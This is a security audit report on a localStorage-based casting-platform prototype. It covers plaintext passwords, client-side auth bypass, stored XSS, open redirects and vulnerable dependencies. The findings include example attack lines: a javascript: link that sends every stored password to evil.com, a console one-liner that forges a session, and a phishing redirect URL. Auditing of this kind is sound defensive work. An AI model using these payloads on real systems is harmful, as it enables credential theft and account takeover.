# IndCasting — Frontend Security Audit Report

**Date:** 2026-08-08
**Scope:** Entire `src/` codebase, `public/`, `next.config.ts`, `package.json` (dependency audit)
**Method:** Manual static code review of all 91 source files + `npm audit` for dependency vulnerabilities + git history review for committed secrets.
**Result:** No files modified.

---

## Executive Summary

This is a **client-side-only prototype**. There is no backend: authentication, authorization, casting posts, portfolios, auditions, and user records all live in `localStorage`. That architecture produces the two most severe problems in this codebase:

1. **All user passwords are stored in plaintext in `localStorage`** and every auth/authorization decision is made client-side against data the attacker fully controls. Any script running on the page (from an XSS bug, a compromised third-party script, or the user's own console) can dump every registered user's password and impersonate any account with one line of code.
2. **Dependency hygiene is poor** — `npm audit` reports **6 high-severity findings** (including 11 Next.js advisories: middleware bypass, SSRF, cache confusion, DoS) fixable by upgrading `next` to `16.3.0`.

Because there is no server, classic server-side categories (CSRF, CORS, session cookies, server-side file upload) are **not applicable yet** — but they will become critical the moment a real backend is introduced if the current localStorage auth model is carried over.

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High     | 4 |
| Medium   | 8 |
| Low      | 8 |

---

## Findings Summary Table

| # | Severity | Title | Location |
|---|----------|-------|----------|
| 1 | Critical | Plaintext passwords stored in localStorage | `src/utils/auth.ts:6-15,17-33` |
| 2 | Critical | Client-side-only authentication & authorization (trivially bypassable) | `src/utils/auth.ts`, `src/app/dashboard/page.tsx:8-28`, all dashboard pages |
| 3 | High | Stored XSS via unsanitized portfolio/social links (`javascript:` href) | `src/app/portfolio/[username]/page.tsx:123-124,202-206` |
| 4 | High | Open redirect via `?redirect=` query parameter | `src/app/login/page.tsx:19,31-32,56-57`, `src/app/signup/page.tsx:18,44-45` |
| 5 | High | Third-party scripts injected at runtime with no SRI | `src/app/page.tsx:58-67,130-131`, `src/app/post/page.tsx:39-48,651-652`, `src/app/membership/page.tsx:65-73,176-177` |
| 6 | High | 6 high-severity dependency vulnerabilities (Next.js etc.) | `package.json:16`, `package-lock.json` |
| 7 | Medium | No CSP / security headers / clickjacking protection | `next.config.ts:3-5`, `src/app/layout.tsx:13-17` |
| 8 | Medium | File uploads stored as unbounded base64 in localStorage (no size/type enforcement) | `src/components/portfolio/BasicInfoForm.tsx:16-25`, `MiscForm.tsx:24-35`, `CertificationsForm.tsx:35`, `ProjectsForm.tsx:37` |
| 9 | Medium | "Private" portfolio fields still shown to everyone ("Recruiter Only" = Public) | `src/app/portfolio/[username]/page.tsx:44-49` |
| 10 | Medium | Password change flow is fake — never verifies or updates the password | `src/app/dashboard/settings/page.tsx:61-85` |
| 11 | Medium | Shared localStorage data lets any user mutate/read others' data (auditions, posts) | `src/utils/auditionData.ts:125-148`, `src/utils/storage.ts:5-51` |
| 12 | Medium | Hardcoded demo/dev credentials and fake user logic shipped to clients | `src/components/Header.tsx:17-22`, `src/app/post/page.tsx:364,701` |
| 13 | Medium | User-controlled values interpolated into CSS `url()` backgrounds | `src/app/portfolio/[username]/page.tsx:57,117`, `src/app/portfolio/builder/page.tsx:383` |
| 14 | Medium | No email uniqueness / validation, no password policy on registration | `src/utils/auth.ts:11-15`, `src/app/signup/page.tsx:34-42` |
| 15 | Low | `innerHTML` used to re-render static heading text | `src/app/page.tsx:182` |
| 16 | Low | 16× `dangerouslySetInnerHTML` for inline `<style>` blocks | `src/app/page.tsx:323`, `src/components/Header.tsx:225`, `DayScheduleModal.tsx:235`, `SpotlightCard.tsx:47`, `AuthLayout.tsx:10`, `portfolio/builder/page.tsx:145`, `talents/page.tsx:146`, and 8 dashboard pages |
| 17 | Low | Meeting-link scheme check is an unsafe `startsWith('http')` | `src/components/DayScheduleModal.tsx:187-188` |
| 18 | Low | `https://` + user data concatenation in href | `src/app/talents/[slug]/page.tsx:806-808` |
| 19 | Low | Weak random IDs (`Math.random`) | `src/app/post/page.tsx:122`, `src/app/signup/page.tsx:35` |
| 20 | Low | Inconsistent auth storage keys break session flow | `src/app/dashboard/page.tsx:11` vs `src/utils/auth.ts:4` |
| 21 | Low | Auth/session data (incl. passwords) readable by any third-party script / XSS | `src/utils/auth.ts:26-41` |
| 22 | Low | No robots.txt / security.txt / duplicate `home.mp4.mp4` | `public/` |

---

## Detailed Findings

### F1 — CRITICAL — Plaintext passwords stored in `localStorage`

**Location:** `src/utils/auth.ts:6-15` (`getUsers`, `registerUser`), `17-33` (`loginUser`), `src/types/user.ts:5` (`password: string`)

**Description:** On signup, the raw password is stored unencrypted in `localStorage` under `indcasting_users` (a JSON array of all users). The current session object (also containing the password) is written to `localStorage`/`sessionStorage` under `indcasting_current_user`. Passwords are also echoed back into the settings UI (`src/app/dashboard/seeker/settings/page.tsx:21`).

**Exploitation:** Any JavaScript that runs in the page (user console, an XSS bug, a compromised CDN script — see F5) can execute `localStorage.getItem('indcasting_users')` and obtain every account's email + password in cleartext. Anyone with physical access to the machine can do the same via DevTools. Passwords are often reused across sites, so this scales to account takeover beyond the app. No hashing, no salt, no key derivation of any kind.

**Fix:** Never store credentials client-side.
- Move auth to a server-side backend (Next.js API routes / server actions). Store only a non-sensitive session identifier (HTTP-only, Secure, SameSite cookie) on the client.
- Hash passwords server-side with a memory-hard KDF (bcrypt/argon2). Never log or transmit raw passwords.
- If a temporary client-only prototype is unavoidable, at minimum hash the password client-side (e.g., SHA-256 of password + salt) — but note this is still not real security and must not ship to production.

---

### F2 — CRITICAL — Client-side-only authentication & authorization

**Location:** `src/utils/auth.ts:35-41` (`getCurrentUser`), `src/app/dashboard/page.tsx:8-28`, every dashboard page redirect, `src/utils/auditionData.ts:125-148`, `src/utils/storage.ts`

**Description:** There is no server. "Logged in" means "a JSON blob exists in localStorage". The role (`talent`/`seeker`) is read from that blob to decide which dashboard to show (`dashboard/page.tsx:28`). All page-level auth guards (`MessagesView.tsx:27-34`, `NotificationsView.tsx:41-47`, portfolio builder `portfolio/builder/page.tsx:41-45`) trust `getCurrentUser()`.

**Exploitation:** In the browser console (or via any XSS), an attacker runs:
```js
localStorage.setItem('indcasting_current_user', JSON.stringify({ id:'x', name:'Hacker', email:'h@e.com', password:'x', role:'seeker', phone:'', city:'' }));
location.href='/dashboard';
```
and gains full access to both dashboard roles. Because "private" data is also stored in the same localStorage and the seeker/talent partition is purely cosmetic, any user can also read every other "user's" portfolios/posts/auditions. The "Recruiter Only" privacy setting is never enforced (see F9). There is no session expiry, no rate limiting on `loginUser`, and `updateAuditionStatus`/`rescheduleAudition` mutate shared records without ownership checks.

**Fix:** Move authentication, session management, and authorization checks to the server. Never trust client-supplied identity. Server must enforce: who may view what portfolio, who may edit which audition/post, role-based route protection, and session validation on every request. Client-side checks can only be cosmetic (UX), never a security boundary.

---

### F3 — HIGH — Stored XSS via unsanitized portfolio/social links

**Location:** `src/app/portfolio/[username]/page.tsx:123-124` (`githubLink`, `liveDemoLink`), `202-206` (`socialLinks.linkedin/github/twitter/instagram/youtube`); input side: `src/components/portfolio/MiscForm.tsx:94-99` and `src/components/portfolio/BasicInfoForm.tsx:104-110`

**Description:** Portfolio fields (social URLs, project links) are user-controlled (typed into `type="url"` inputs and persisted to `localStorage`). They are then rendered verbatim into `<a href={...}>` tags on the public portfolio page. `type="url"` accepts `javascript:` as a valid URL scheme, so a value like `javascript:alert(document.cookie)` passes validation and is stored.

**Exploitation:** A talent crafts their portfolio with `socialLinks.github = "javascript:fetch('https://evil.com/?d='+encodeURIComponent(localStorage.getItem('indcasting_users')))"`. When a casting director visits the victim talent's public page and clicks the GitHub icon, the payload executes **in the casting director's session**, exfiltrating that director's stored credentials/session and allowing account takeover and further stored XSS propagation.

**Fix:** Whitelist URL schemes before rendering/redirecting. Reject anything that is not `http:`/`https:` (also reject `//`-protocol-relative). Server-side: validate on input; client-side defense-in-depth: normalize with `new URL(value, window.location.origin)` and check `protocol`. React does not auto-escape `href` attributes.

---

### F4 — HIGH — Open redirect via `?redirect=` query parameter

**Location:** `src/app/login/page.tsx:19` (`redirect = searchParams.get("redirect")`), `31-32` and `56-57` (`router.push(redirect)`); `src/app/signup/page.tsx:18,44-45`

**Description:** The `redirect` value is read directly from the URL query string and passed unvalidated to `router.push()`. Next's App Router will perform a full navigation for external URLs, so `?redirect=https://evil.com` (or `//evil.com`) sends the user to an attacker-controlled site after they authenticate.

**Exploitation:** Phishing chain: attacker emails a link like `https://indcasting.in/login?redirect=https://evil-phish.com/`. Victim logs in with real credentials, is silently forwarded to the phishing page styled as "session expired — re-enter password," and leaks their password. Because the redirect happens right after a successful login, victims are primed to trust it.

**Fix:** Never redirect to an arbitrary string from the query. Maintain an allowlist of internal paths (must start with `/` and not `//`, and not contain `\` or control chars, ideally validated against a static route allowlist). Reject `http:`, `https:`, `javascript:`, `data:`, and any scheme.

---

### F5 — HIGH — Third-party scripts injected at runtime with no SRI

**Location:** `src/app/page.tsx:58-67` (`loadScript`), `130-131` (GSAP from `cdnjs.cloudflare.com`); same pattern in `src/app/post/page.tsx:39-48,651-652`; `src/app/membership/page.tsx:65-73,176-177`

**Description:** GSAP (and ScrollTrigger) are loaded by creating `<script>` elements pointing at `https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/...` with **no `integrity` (SRI) attribute** and no origin check. Note: the app also declares `gsap@3.15.0` in `package.json` — a different version than the 3.12.5 being loaded from CDN.

**Exploitation:** If cdnjs is compromised, its TLS is broken, or the account publishing `gsap.min.js` is hijacked, the attacker's code executes with full access to the IndCasting origin — including `localStorage` (all passwords, F1). Third-party script injection is a high-value, high-impact supply-chain target.

**Fix:** Stop loading GSAP from a CDN; import it as an npm module (`import { gsap } from "gsap"`) as the repo already does in `components/ui/SplitText.tsx`, and bundle it. If a CDN is truly required, add SRI `integrity` hashes and pin exact versions, plus a tight CSP (`script-src`). Remove the duplicate unused GSAP dependency and version drift.

---

### F6 — HIGH — 6 high-severity dependency vulnerabilities

**Location:** `package.json:16` (`"next": "16.2.10"`), `package-lock.json`

**Description:** `npm audit` reports **6 high, 0 critical** findings (see Appendix A):

- **next 16.2.10** — 11 advisories, all fixed in `16.3.0`, including: Middleware/proxy bypass in App Router + Turbopack (GHSA-6gpp-xcg3-4w24), DoS in server actions (GHSA-m99w-x7hq-7vfj), SSRF in server actions on custom servers (GHSA-89xv-2m56-2m9x), SSRF in rewrites (GHSA-p9j2-gv94-2wf4), cache confusion of response bodies (GHSA-68g3-v927-f742 / GHSA-4633-3j49-mh5q), unbounded server-action payload (GHSA-4c39-4ccg-62r3), DoS in image optimization via SVGs (GHSA-q8wf-6r8g-63ch), disclosure of internal server-function endpoints (GHSA-955p-x3mx-jcvp).
- **postcss** (via next) — arbitrary file read via `sourceMappingURL` + XSS via unescaped `</style>` (GHSA-6g55-p6wh-862q, GHSA-qx2v-qp2m-jg93, GHSA-r28c-9q8g-f849, GHSA-fxqj-rqcc-2cmp).
- **sharp** (via next) — libvips CVEs (GHSA-f88m-g3jw-g9cj).
- **brace-expansion** (dev, via `@typescript-eslint`) — DoS via unbounded expansion (GHSA-mh99-v99m-4gvg, GHSA-rgw5-rvv9-x895).
- **js-yaml** (dev) — quadratic CPU DoS (CVE-2026-59870, GHSA-5p4m-2wfm-xmqj).
- **nanoid** (via next) — generator can loop indefinitely (GHSA-2v37-7h3g-55p8).

**Exploitation:** The Next.js SSRF / cache-confusion / middleware-bypass issues become exploitable as soon as server-side routes, rewrites, or middleware are introduced (many are patched-version-only). The DoS issues affect build/dev tooling and image optimization. `npm audit fix` (or `npm audit fix --force` for the dev-transitive ones) is required.

**Fix:** Upgrade `next` → `16.3.0` (the recommended fix per audit), run `npm audit fix`, and re-run `npm audit` until clean. Adopt a dependency-update cadence (e.g., `npx npm-check-updates` / Dependabot) and pin exact versions for production deps.

---

### F7 — MEDIUM — No CSP / security headers / clickjacking protection

**Location:** `next.config.ts:3-5` (empty config — no `headers()`), `src/app/layout.tsx:13-17` (no security metadata)

**Description:** The application ships no Content-Security-Policy, no `X-Frame-Options`/`frame-ancestors`, no `X-Content-Type-Options`, no `Referrer-Policy`, no `Strict-Transport-Security`. Next.js does not add these by default.

**Exploitation:**
- **Clickjacking:** an attacker embeds `https://indcasting.in/login` (or a booking/apply button) in a transparent iframe and overlays a decoy UI. A victim "clicks a prize button" but actually submits the real login/apply/delete form. CSP `frame-ancestors` / `X-Frame-Options: DENY` would prevent framing.
- **CSP-less XSS amplification:** without `default-src 'self'` + a strict `script-src`, any injected script (F3) executes unimpeded.

**Fix:** In `next.config.ts` add a `headers()` block, at minimum:
```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY        (or CSP frame-ancestors 'none')
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'
```
(Adjust `img-src`/`connect-src` for the image domain and any API. Prefer `style-src` without `'unsafe-inline'` once inline `<style>` blocks are moved to CSS files — see F16.)

---

### F8 — MEDIUM — Unsafe file upload handling (unbounded base64 in localStorage)

**Location:** `src/components/portfolio/BasicInfoForm.tsx:16-25` (images → `FileReader.readAsDataURL`), `MiscForm.tsx:24-35` (resume), `CertificationsForm.tsx:35`, `ProjectsForm.tsx:37`

**Description:** Images and resumes are read as base64 data-URLs and persisted into `localStorage` (`portfolioStorage.ts`), with **no file-size limit**, no dimension/count limits, and only a trivially spoofable MIME check for the resume (`file.type === "application/pdf"`). There is no server upload path at all, so files never leave the browser.

**Exploitation:**
- **localStorage quota exhaustion (self-DoS):** a multi-MB image becomes ~1.33× larger as base64; several uploads exceed the ~5–10 MB localStorage quota, throwing `QuotaExceededError` and breaking the whole app for that user.
- **PII persistence:** photos and full resumes remain readable in plaintext in localStorage indefinitely — exfiltratable by any XSS/CDN compromise (F1/F5).
- The `file.type` check is bypassable by renaming/forging MIME, though stored payloads are not executed as HTML in current code paths.

**Fix:** Enforce size limits (e.g., reject > 2 MB, downscale images client-side), cap counts, validate actual file content/magic bytes, and — for any real deployment — upload to a backend/object store with server-side validation, MIME allowlisting, and random filenames, never storing documents in localStorage.

---

### F9 — MEDIUM — "Private" / "Recruiter Only" portfolio fields are public

**Location:** `src/app/portfolio/[username]/page.tsx:44-49` (`isVisible`)

**Description:** The privacy control function returns `true` (visible) for everything that is not `"Private"`, and explicitly treats `"Recruiter Only"` as public ("we'll assume Public for display here unless Private"). Email/phone/resume/socials marked Recruiter Only are shown to every anonymous visitor.

**Exploitation:** Any anonymous visitor can harvest talent's private phone numbers, emails, and resume PDFs simply by visiting `/portfolio/<slug>` — defeating the product's stated privacy feature and enabling spam/phishing/contact harassment.

**Fix:** Enforce the privacy setting on the server; for "Recruiter Only," hide the field unless the requesting session is authenticated with `role === 'seeker'` (and ideally an approved recruiter relationship). Never trust a client-side flag for data exposure decisions (see F2).

---

### F10 — MEDIUM — Password change flow is simulated; current password never verified

**Location:** `src/app/dashboard/settings/page.tsx:61-85` (`handleSaveSecurity`)

**Description:** The "security" tab validates that new passwords match and are ≥8 chars, then after a fake 1200 ms delay shows a success toast. It **never verifies the current password** and **never writes the new password** to storage — the password literally cannot be changed. (Meanwhile `src/app/dashboard/seeker/settings/page.tsx:25-37` *does* write the password back, but with no verification and in plaintext.)

**Exploitation:** Users believe they have rotated a compromised credential when they have not. Combined with plaintext storage (F1), an attacker who already has read access can continue using the old password indefinitely. The fake "current password required" check is also meaningless because the stored password is trivially read.

**Fix:** Implement a real change-password flow server-side: verify the current password, enforce a policy, and update only a server-side hash. Never present simulated security operations to users.

---

### F11 — MEDIUM — No per-user data isolation (shared localStorage objects)

**Location:** `src/utils/auditionData.ts:125-148` (`getAuditionsForUser`, `updateAuditionStatus`, `rescheduleAudition`), `src/utils/storage.ts:5-51` (posts), `src/utils/portfolioStorage.ts:5-57` (portfolios)

**Description:** All "users" share the same localStorage keys (`indcasting_auditions`, `castingPosts`/`casting_posts`, `indcasting_portfolios`). There is no server, so `updateAuditionStatus('aud_4', 'Cancelled')` cancels *anyone's* audition; `deletePost(id)` deletes any post; `getPortfolioBySlug` returns any published portfolio. Authorization is purely cosmetic (`isOwn` flags, userId fields).

**Exploitation:** Any visitor can open DevTools and, via the page's own utility functions or direct localStorage writes, cancel other talents' auditions, delete others' casting calls, unpublish portfolios, or read all resumes — i.e., full cross-user data manipulation with no credentials.

**Fix:** Move all shared/mutable data to a backend with server-side ownership checks (the `userId`/`talentId`/`seekerId` fields are the correct model — enforce them server-side). Client-side ownership checks are cosmetic only.

---

### F12 — MEDIUM — Hardcoded demo/dev credentials shipped in client bundle

**Location:** `src/components/Header.tsx:17-22` (`password: "password"`, `demo@example.com` mock user), `src/app/post/page.tsx:364,701` (`userId: "current-user"` hardcoded ownership)

**Description:** When not logged in, any `/dashboard*` route shows a fabricated user with password `"password"`, and all casting posts are owned by the constant `"current-user"`. This normalizes fake identity in the UI and ships a "known credential" pattern.

**Exploitation:** Encourages insecure patterns and masks the fact that there is no real authentication. In any future wiring, a hardcoded `"current-user"` ownership check could be shipped to production, letting any user edit/delete others' posts (defense-in-depth risk). Demo creds like `demo@example.com / password` are classic post-compromise persistence and can be mistaken for a real account.

**Fix:** Remove the mock-user fallback and hardcoded ownership; gate dashboards on the real authenticated session (server-side). Use real IDs from the authenticated user object.

---

### F13 — MEDIUM — User-controlled values injected into CSS `url()`

**Location:** `src/app/portfolio/[username]/page.tsx:57` (`backgroundImage: url(${basicInfo.coverBanner})`), `117` (`url(${p.images[0]})`), `src/app/portfolio/builder/page.tsx:383` (`url(${info.coverBanner})`); inputs: `src/components/portfolio/BasicInfoForm.tsx:41,53`, `ProjectsForm.tsx:89`

**Description:** Image paths come from user-controlled localStorage (data-URLs or arbitrary strings) and are concatenated directly into CSS `backgroundImage: url(...)`.

**Exploitation:** A malicious value can break out of the `url()` context to inject additional CSS rules (CSS injection), or set `url(https://attacker.com/tracker)` to harvest viewing IPs/user-agents of everyone who opens the talent's public portfolio (privacy/analytics bypass). Data-URL images also embed large blobs into the page HTML, slowing the page and enabling tracking. CSS-injection alone rarely escalates to script execution in modern browsers, hence Medium, but combined with other vectors it expands the attack surface.

**Fix:** Validate image inputs to a strict allowlist (server-hosted URLs or a dedicated upload domain, `https:` only). Render images with `<img>`/Next `<Image>` with explicit `src` validation rather than interpolating raw strings into `url()`.

---

### F14 — MEDIUM — Weak registration: no uniqueness, no verification, no policy

**Location:** `src/utils/auth.ts:11-15` (`registerUser`), `src/app/signup/page.tsx:34-42`

**Description:** `registerUser` pushes a new record even if the email already exists; there is no email verification, no password strength policy, and no rate limiting. `loginUser` (auth.ts:20-22) returns the *first* match on `email && password` with no constant-time comparison.

**Exploitation:** Duplicate accounts shadow the intended one (login picks whichever comes first). Missing password policy allows trivially weak credentials. Missing verification + plaintext storage means account takeover and enumeration are easy once an attacker has partial data. Timing of the string compare is not exploitable meaningfully in a client-only app but signals the same weakness if ported server-side.

**Fix:** Enforce email uniqueness + basic password policy; verify email; hash with salt; compare hashes in constant time. All of this must live server-side.

---

### F15 — LOW — `innerHTML` used to re-render heading text

**Location:** `src/app/page.tsx:182` (`eyebrow.innerHTML = text.split("").map(c => ...`).`join("")`)

**Description:** The hero "eyebrow" text is re-rendered by wrapping each character in `<span class="e-ch">`. The source text is `eyebrow.textContent` of a static element inside the same component (`.tiles-eyebrow`), i.e., not currently attacker-controlled.

**Exploitation:** Not exploitable today because the content is hardcoded. But this is exactly the pattern that becomes DOM-XSS the moment the string becomes user- or URL-derived (e.g., a configurable site tagline). The animation can be done without HTML injection.

**Fix:** Build the per-character `<span>` elements with React JSX (e.g., `text.split("").map((c,i) => <span key={i} className="e-ch">{c === " " ? "\u00A0" : c}</span>)`) instead of `innerHTML`. This eliminates the injection class entirely.

---

### F16 — LOW — 16× `dangerouslySetInnerHTML` for inline `<style>` blocks

**Location:** `src/app/page.tsx:323`, `src/components/Header.tsx:225`, `src/components/DayScheduleModal.tsx:235`, `src/components/ui/SpotlightCard.tsx:47`, `src/components/auth/AuthLayout.tsx:10`, `src/app/portfolio/builder/page.tsx:145`, `src/app/talents/page.tsx:146`, `src/app/dashboard/casting-calls/page.tsx:189`, `src/app/dashboard/applications/page.tsx:202`, `src/app/dashboard/talent/page.tsx:486`, `src/app/dashboard/portfolio/page.tsx:449`, `src/app/dashboard/settings/page.tsx:251`, `src/app/dashboard/saved/page.tsx:202`, `src/app/dashboard/seeker/casting-calls/page.tsx:166`, `src/app/dashboard/seeker/page.tsx:348`, `src/app/dashboard/seeker/auditions/page.tsx:105`

**Description:** All 16 occurrences are static CSS strings (`__html: \`...\``) with no interpolated variables. React's `dangerouslySetInnerHTML` bypasses the escaping that would otherwise apply to `{children}`.

**Exploitation:** Not exploitable while contents remain static literals. The risk is entirely latent: the moment a developer interpolates a variable into one of these template literals (e.g., a theme color, a `portfolio.completionPercentage`-derived value as already seen at `portfolio/builder/page.tsx:177`), it becomes HTML/CSS injection (and potentially XSS via `</style><script>`). CSP `style-src 'unsafe-inline'` is already required for these.

**Fix:** Move static styles to `.css`/CSS-modules files. Where dynamic CSS values are needed, set them via React `style` props or CSS custom properties (`--progress: X`) rather than injecting into `<style>` text. Ban `dangerouslySetInnerHTML` with an ESLint rule.

---

### F17 — LOW — Unsafe URL scheme check for meeting links

**Location:** `src/components/DayScheduleModal.tsx:187-188` (`audition.location.startsWith('http')`)

**Description:** Audition `location` is user-stored data (localStorage). The code renders it as a clickable link only if it `startsWith('http')`. This blocks the obvious `javascript:` scheme, but is a fragile prefix match: `http://evil` passes, and weird-but-valid variants can slip through depending on how the browser parses the string. It does not constrain to a trusted domain.

**Exploitation:** An attacker who can write audition data (see F11) can set `location` to a phishing/credential-harvesting URL; the "Join Meeting" button is trusted by talent because it looks like a normal meeting link. `startsWith` is not a security check.

**Fix:** Parse with `new URL(location)` and require `protocol === 'https:'` (or `http:` for dev only). Consider allowing only known video-conference domains.

---

### F18 — LOW — String concatenation into `https://` href

**Location:** `src/app/talents/[slug]/page.tsx:806-808` (`<a href={`https://${p.website}`}>`)

**Description:** `p.website` is interpolated into `https://` + value. The hardcoded scheme prevents `javascript:`/`data:` injection, but the data is untrusted (in the current code it's mock; will become user data). Values with control characters or `@`/`\` could still produce malformed/abusive URLs (e.g., `https://attacker.com@evil.tld`), and an empty string yields a broken `https://` link.

**Exploitation:** Currently low, because profiles are hardcoded mocks. If/when driven by real user data, it enables link-decoration abuse for phishing.

**Fix:** Normalize via `new URL()` and validate the scheme and hostname at the point the data is entered, and store the full URL. Only render the anchor when the parsed value is valid `https:`.

---

### F19 — LOW — Weak random identifiers

**Location:** `src/app/post/page.tsx:122` (`uid()` uses `Math.random`), `src/app/signup/page.tsx:35` (`id: Date.now().toString()`)

**Description:** Post/user IDs are generated from `Math.random()` + `Date.now()`, which are predictable/guessable.

**Exploitation:** In a client-only app the practical impact is minimal (IDs are cosmetic). If these IDs ever become authorization identifiers or tokens (e.g., shared portfolio slugs, booking IDs, password-reset tokens), predictability enables IDOR/brute-force. Portfolio slugs are human-derived names (`portfolioStorage.ts:43-57`), so nothing secret depends on randomness today.

**Fix:** Use `crypto.randomUUID()` for IDs that could ever be security-relevant; for slugs, combine with a random suffix.

---

### F20 — LOW — Inconsistent auth storage keys

**Location:** `src/app/dashboard/page.tsx:11` (`window.localStorage.getItem("currentUser")`) vs `src/utils/auth.ts:4,38` (`"indcasting_current_user"`)

**Description:** The `/dashboard` redirect reads key `currentUser`, while every other module uses `indcasting_current_user`. The dashboard therefore never finds the session and always bounces to `/login` (where the correct key is read and the user is forwarded). Also, `src/utils/storage.ts` uses `casting_posts` while `src/app/post/page.tsx:32` uses `castingPosts` — two divergent stores of the same data.

**Exploitation:** Functionally broken auth flow (users can't land on their dashboard directly) and duplicate/conflicting data stores. The divergence itself is not a security hole, but it is exactly the kind of ambiguity that causes auth bypasses when one code path trusts one key and a guard reads another.

**Fix:** Centralize storage keys in one module (`utils/auth.ts`) and delete the inline duplicate in `dashboard/page.tsx`. Unify the casting-post key.

---

### F21 — LOW — Session data readable by any in-page script

**Location:** `src/utils/auth.ts:26-41`, `sessionStorage`/`localStorage` writes

**Description:** Because authentication state is stored in `localStorage`/`sessionStorage` (no HttpOnly cookie), it is readable/writable by any JavaScript in the page — including third-party scripts, browser extensions, and XSS. This is the amplifying factor behind F1, F3, F5, and F8.

**Exploitation:** Any single code-execution primitive anywhere in the app (or a compromised CDN) becomes full credential + session exfiltration and account takeover. This is inherent to the localStorage-auth design.

**Fix:** This is a consequence of F1/F2, but the durable fix is server-side sessions stored in **HttpOnly, Secure, SameSite cookies**. Treat any client-side "session" as a UX convenience, never as a security boundary.

---

### F22 — LOW — Missing robots.txt/security.txt; duplicate asset

**Location:** `public/` (no `robots.txt`, no `security.txt`; `home.mp4.mp4` duplicate of `home.mp4`)

**Description:** No `robots.txt` (search engines may index unauthenticated admin-ish routes like `/dashboard` and `/portfolio/*`), no `security.txt` (no disclosure channel), and a stray duplicated 2.4 MB `home.mp4.mp4` in `public/` doubles asset weight.

**Exploitation:** Indexing of `dashboard` routes can leak page structure to attackers; the extra file is pure bloat/confusion. No direct exploit.

**Fix:** Add `robots.txt`, add `security.txt`, remove the duplicate video file.

---

## Checks with No Findings

- **`postMessage`:** No `window.postMessage` / `addEventListener('message')` usage found anywhere in `src/`. Not applicable.
- **`<iframe>` usage:** No iframes rendered or configured (`X-Frame-Options` still recommended for defense — see F7). Not applicable.
- **`eval` / `new Function` / `document.write`:** None found. The only dynamic script injection is `loadScript` (F5).
- **Prototype pollution:** No `Object.assign`/`merge`/`lodash.merge`-style deep-merging of untrusted objects found; `JSON.parse` results are used as data, not merged into prototypes. No finding.
- **Hardcoded API keys / tokens / secrets:** None found. `git log` and `git ls-files` show no committed `.env*` files and no secret material in history. `.gitignore` correctly excludes `.env*`. (Only a demo password string — F12.)
- **Cookies:** The app uses no cookies at all (auth is localStorage-based). Nothing to harden today, but see F21 for the migration path.
- **CSRF:** Not applicable — there are no state-changing HTTP endpoints (no backend, no fetch/XHR to a same-origin API).
- **CORS:** Not applicable — no cross-origin API calls made. Note for the future: a localStorage-token auth model combined with a real API needs strict CORS + SameSite cookie handling.
- **Source maps:** `.next/` and `*.map` files are gitignored and `.gitignore` covers build output; production source maps are off by default. The real exposure is that the *entire data model and auth logic* ships in the client bundle by design (F1/F2).

---

## Recommended Remediation Priorities

1. **Do not deploy this as-is.** The localStorage auth model (F1, F2) is a Critical blocker for any real users.
2. **Upgrade dependencies** (`next@16.3.0`, `npm audit fix`) — F6. Low effort, immediate risk reduction.
3. **Introduce a server layer** (Next.js API routes/server actions): real sessions (HttpOnly cookies), hashed passwords, server-enforced authorization/ownership/privacy checks. Resolves F1, F2, F9, F10, F11, F14, F21.
4. **Harden client rendering:** validate URL schemes for all user-supplied `href`s (F3, F17, F18); remove `innerHTML`/`dangerouslySetInnerHTML` (F15, F16); validate `?redirect=` (F4); validate image inputs (F13).
5. **Stop loading third-party scripts at runtime** — bundle GSAP via npm (F5).
6. **Add security headers + CSP** in `next.config.ts` (F7).
7. **Fix file upload handling** — size limits, real server-side uploads (F8).
8. **Clean up** mock credentials, divergent storage keys, duplicate assets, and dead files (F12, F20, F22).

---

## Appendix A — `npm audit` Output (abridged)

```
6 vulnerabilities found (6 high, 0 critical)

brace-expansion  high  DoS via unbounded expansion (GHSA-mh99-v99m-4gvg,
                       GHSA-rgw5-rvv9-x895)  — dev (via @typescript-eslint)
js-yaml          high  Quadratic CPU DoS CVE-2026-59870 (GHSA-5p4m-2wfm-xmqj) — dev
nanoid           high  Custom generators can loop (GHSA-2v37-7h3g-55p8) — via next
next             high  11 advisories; fix: 16.3.0
                       (GHSA-6gpp-xcg3-4w24 middleware bypass,
                        GHSA-m99w-x7hq-7vfj DoS, GHSA-89xv-2m56-2m9x SSRF,
                        GHSA-p9j2-gv94-2wf4 SSRF rewrites, cache-confusion,
                        image-opt DoS, endpoint disclosure, ...)
postcss          high  sourceMappingURL arbitrary file read + XSS (GHSA-6g55-p6wh-862q
                       et al.) — via next
sharp            high  libvips CVEs (GHSA-f88m-g3jw-g9cj) — via next
```

---

*Report generated by automated static analysis + manual review. No source files were modified.*
